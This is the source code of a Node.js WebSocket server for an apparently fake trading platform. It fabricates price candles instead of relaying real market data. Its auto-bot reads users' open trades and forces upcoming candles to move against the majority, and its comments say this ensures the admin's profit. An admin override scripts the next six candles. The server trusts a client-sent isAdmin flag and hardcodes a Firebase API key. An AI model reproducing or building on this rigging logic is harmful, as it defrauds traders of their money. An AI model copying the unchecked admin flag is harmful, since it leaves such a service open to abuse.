const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 300; 
const TIMEFRAME = 60000; 
const TICK_MS = 200;
const MIN_PRICE = 0.00001;

const markets = {}; 
let activeTradesData = {}; 

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// Listen to active trades for AUTO BOT manipulation
db.ref('admin/markets').on('value', (snapshot) => {
    const data = snapshot.val() || {};
    activeTradesData = {};
    Object.keys(data).forEach(marketId => {
        activeTradesData[marketId] = data[marketId].activeTrades || {};
    });
});

// 📌 জেনারেট ক্যান্ডেল লজিক (ভবিষ্যতের ক্যান্ডেল বানানোর জন্য)
function generateCandle(timestamp, openPrice, forcedColor = null) {
    const baseVol = openPrice * 0.00006;
    const bodySize = baseVol * (0.5 + Math.random());
    
    let isGreen;
    if (forcedColor === 'GREEN') isGreen = true;
    else if (forcedColor === 'RED') isGreen = false;
    else isGreen = Math.random() > 0.5; // Auto random if no force

    let targetClose = isGreen ? openPrice + bodySize : openPrice - bodySize;
    targetClose = roundPrice(targetClose);
    
    const wickMax = Math.abs(targetClose - openPrice) * 0.5 + (openPrice * 0.00003);
    const high = roundPrice(Math.max(openPrice, targetClose) + (Math.random() * wickMax));
    const low = roundPrice(Math.min(openPrice, targetClose) - (Math.random() * wickMax));

    return { timestamp, open: roundPrice(openPrice), close: targetClose, high, low, color: isGreen ? 'GREEN' : 'RED' };
}

// 📌 মার্কেট ইনিশিয়ালাইজেশন (History + 6 Future Candles)
async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.25000; 
    
    try {
        const snap = await db.ref(`markets/${path}/live`).once('value');
        if (snap.exists() && snap.val().price) startPrice = snap.val().price;
    } catch (e) { console.log(`No live price for ${marketId}, starting new.`); }

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let lastClose = startPrice;

    // Generate Past History
    for (let i = MAX_CANDLES; i > 0; i--) {
        let c = generateCandle(nowPeriod - (i * TIMEFRAME), lastClose);
        candles.unshift(c);
        lastClose = c.close;
    }
    candles[candles.length - 1].close = startPrice; 

    // Generate Future 6 Candles
    let futureQueue = [];
    let futureStartPrice = startPrice;
    for(let i = 1; i <= 6; i++) {
        let fc = generateCandle(nowPeriod + (i * TIMEFRAME), futureStartPrice);
        futureQueue.push(fc);
        futureStartPrice = fc.close;
    }

    markets[marketId] = {
        marketId, marketPath: path, history: candles, 
        futureQueue: futureQueue, liveCandle: null,
        mode: 'AUTO', // 'AUTO' or 'MANUAL'
        manualCandlesLeft: 0,
        manualCooldownUntil: 0,
        noise: 0
    };
    console.log(`Market Initialized: ${marketId} with Future Queue`);
}

// 📌 AUTO BOT LOGIC (অ্যাডমিনের প্রফিট নিশ্চিত করা)
function applyAutoBotLogic(market) {
    if (market.mode === 'MANUAL') return; // ম্যানুয়াল মোডে হাত দিবে না

    let upVolume = 0;
    let dnVolume = 0;
    const trades = activeTradesData[market.marketId] || {};
    
    // ইউজারদের ট্রেড ভলিউম চেক করা
    Object.values(trades).forEach(trade => {
        if (trade.direction === 'UP') upVolume += parseFloat(trade.amount);
        if (trade.direction === 'DOWN') dnVolume += parseFloat(trade.amount);
    });

    if (upVolume === 0 && dnVolume === 0) return; // কোনো ট্রেড নেই

    // যদি ইউজারদের উইন হওয়ার চান্স থাকে, তবে Future Queue চেঞ্জ করে লস করান
    // টার্গেট: আগামী ৩-৪ নম্বর ক্যান্ডেল চেঞ্জ করে মার্কেট অন্যদিকে ঘুরিয়ে দেয়া
    let targetColor = upVolume > dnVolume ? 'RED' : 'GREEN'; // বেশি মানুষ যেদিকে ট্রেড নিবে, মার্কেট তার উল্টা যাবে
    
    // Future Queue রিক্যালকুলেট করা
    let tempStartPrice = market.futureQueue[0].open;
    for(let i = 0; i < market.futureQueue.length; i++) {
        // শেষের দিকের ক্যান্ডেলগুলো টার্গেট কালার অনুযায়ী ফিক্স করে দিন
        let forced = (i >= 2) ? targetColor : null; 
        market.futureQueue[i] = generateCandle(market.futureQueue[i].timestamp, tempStartPrice, forced);
        tempStartPrice = market.futureQueue[i].close;
    }
}

// 📌 প্রতি টিক আপডেট (ক্যান্ডেল মুভমেন্ট)
function processMarketTick(marketData, currentPeriod) {
    const now = Date.now();
    
    // ১. নতুন মিনিট শুরু হলে Future Queue থেকে ক্যান্ডেল টানা
    if (!marketData.liveCandle || marketData.liveCandle.timestamp !== currentPeriod) {
        
        // আগের ক্যান্ডেল হিস্ট্রিতে সেভ করা
        if (marketData.liveCandle) {
            marketData.history.push({ ...marketData.liveCandle });
            if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        }

        // Future Queue থেকে প্রথম ক্যান্ডেল বের করে লাইভ করা
        let targetCandle = marketData.futureQueue.shift();
        targetCandle.timestamp = currentPeriod;
        
        marketData.liveCandle = { 
            timestamp: currentPeriod, 
            open: targetCandle.open, 
            high: targetCandle.open, 
            low: targetCandle.open, 
            close: targetCandle.open,
            targetClose: targetCandle.close, // কোথায় গিয়ে থামবে
            targetHigh: targetCandle.high,
            targetLow: targetCandle.low
        };

        // Queue তে সবসময় ৬টা ক্যান্ডেল মেইনটেইন করা
        let lastFuturePrice = marketData.futureQueue.length > 0 
            ? marketData.futureQueue[marketData.futureQueue.length - 1].close 
            : targetCandle.close;
        
        let newFutureTimestamp = currentPeriod + (6 * TIMEFRAME);
        marketData.futureQueue.push(generateCandle(newFutureTimestamp, lastFuturePrice));

        // ম্যানুয়াল মোড ট্র্যাকিং
        if (marketData.mode === 'MANUAL') {
            marketData.manualCandlesLeft--;
            if (marketData.manualCandlesLeft <= 0) {
                marketData.mode = 'AUTO';
                marketData.manualCooldownUntil = Date.now() + (15 * 60 * 1000); // 15 Min Lock
                db.ref(`admin/manual_status/${marketData.marketId}`).update({ 
                    status: 'AUTO', cooldownUntil: marketData.manualCooldownUntil 
                });
                console.log(`Market ${marketData.marketId} back to AUTO. Locked for 15 mins.`);
            }
        } else {
            // অটো বট লজিক অ্যাপ্লাই করা
            applyAutoBotLogic(marketData);
        }

        marketData.noise = 0;
    }

    // ২. স্মুথ টিক মুভমেন্ট (লাইভ প্রাইস ടার্গেটের দিকে আগাবে)
    const live = marketData.liveCandle;
    const timeElapsed = now - currentPeriod;
    const progress = Math.min(timeElapsed / 60000, 1.0); 

    const expectedBasePath = live.open + ((live.targetClose - live.open) * progress);
    const noiseMax = Math.abs(live.targetClose - live.open) * 0.20 * (1 - progress); 
    marketData.noise += (Math.random() - 0.5) * noiseMax;
    if (Math.abs(marketData.noise) > noiseMax) marketData.noise *= 0.5;

    let newPrice = expectedBasePath + marketData.noise;

    // Wick (দাগ) তৈরি করা
    if (progress > 0.2 && progress < 0.8) {
        if (Math.random() < 0.05) newPrice = live.targetHigh;
        else if (Math.random() < 0.05) newPrice = live.targetLow;
    }

    if (progress >= 0.97) newPrice = live.targetClose; // শেষে এসে টার্গেটে ফিক্স

    live.close = roundPrice(newPrice);
    live.high = roundPrice(Math.max(live.high, live.close, newPrice));
    live.low = roundPrice(Math.min(live.low, live.close, newPrice));
}

// 📌 ব্রডকাস্ট লজিক (ইউজার এবং অ্যাডমিনের জন্য আলাদা)
function broadcastData(marketId) {
    const market = markets[marketId];
    if(!market || !market.liveCandle) return;

    // ইউজার প্যানেলের ডাটা (Future Queue ছাড়া)
    const userPayload = JSON.stringify({ 
        market: marketId, 
        candle: {
            timestamp: market.liveCandle.timestamp,
            open: market.liveCandle.open,
            high: market.liveCandle.high,
            low: market.liveCandle.low,
            close: market.liveCandle.close
        }, 
        serverTime: Date.now() 
    });

    // অ্যাডমিন প্যানেলের ডাটা (Future Queue সহ)
    const adminPayload = JSON.stringify({
        type: 'admin_sync',
        market: marketId,
        liveCandle: market.liveCandle,
        futureQueue: market.futureQueue,
        mode: market.mode,
        cooldownUntil: market.manualCooldownUntil
    });

    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            if (client.isAdmin) {
                client.send(adminPayload);
            } else {
                client.send(userPayload);
            }
        }
    });
}

// 📌 অ্যাডমিনের ম্যানুয়াল ৬-ক্যান্ডেল কমান্ড রিসিভ করা (Firebase থেকে)
db.ref('admin/manual_override').on('child_added', (snapshot) => {
    const data = snapshot.val();
    // data structure: { marketId: "EUR-USD", directions: ["UP","DOWN","UP","UP","DOWN","RED"], timestamp: 123456 }
    
    if (data && markets[data.marketId]) {
        let market = markets[data.marketId];
        
        // চেক করুন ১৫ মিনিটের লক আছে কি না
        if (Date.now() > market.manualCooldownUntil) {
            market.mode = 'MANUAL';
            market.manualCandlesLeft = 6;
            
            // অ্যাডমিনের দেয়া ডিরেকশন অনুযায়ী Future Queue রি-বিল্ড করা
            let tempStart = market.liveCandle ? market.liveCandle.close : market.history[market.history.length-1].close;
            let currentPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
            
            for(let i=0; i<6; i++) {
                let forceColor = data.directions[i] === 'UP' ? 'GREEN' : 'RED';
                market.futureQueue[i] = generateCandle(currentPeriod + ((i+1)*TIMEFRAME), tempStart, forceColor);
                tempStart = market.futureQueue[i].close;
            }

            db.ref(`admin/manual_status/${data.marketId}`).update({ 
                status: 'MANUAL', cooldownUntil: 0 
            });
            console.log(`Manual 6-Candle Mode Activated for ${data.marketId}`);
        }
        
        // রিকোয়েস্ট ডিলিট করে দিন যেন বারবার ট্রিগার না হয়
        snapshot.ref.remove();
    }
});


db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach((marketId) => {
        const type = fbMarkets[marketId]?.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

app.get('/api/history/:market', (req, res) => {
    const marketId = req.params.market;
    if (markets[marketId]) res.json(markets[marketId].history);
    else res.json([]);
});

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                ws.isAdmin = msg.isAdmin || false; // অ্যাডমিন কি না সেটা সেট করা
                if (markets[msg.market]) {
                    ws.send(JSON.stringify({ type: 'history', market: msg.market, candles: markets[msg.market].history }));
                }
            }
        } catch (_) {}
    });
});

let lastSyncMinute = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    const currentMinute = Math.floor(now / 60000);

    for (const marketId in markets) {
        processMarketTick(markets[marketId], currentPeriod);
        broadcastData(marketId);
    }

    if (currentMinute > lastSyncMinute) {
        lastSyncMinute = currentMinute;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            if (m.liveCandle) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: m.liveCandle.close, timestamp: m.liveCandle.timestamp };
            }
        }
        db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('Advanced Admin Bot Server Running'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));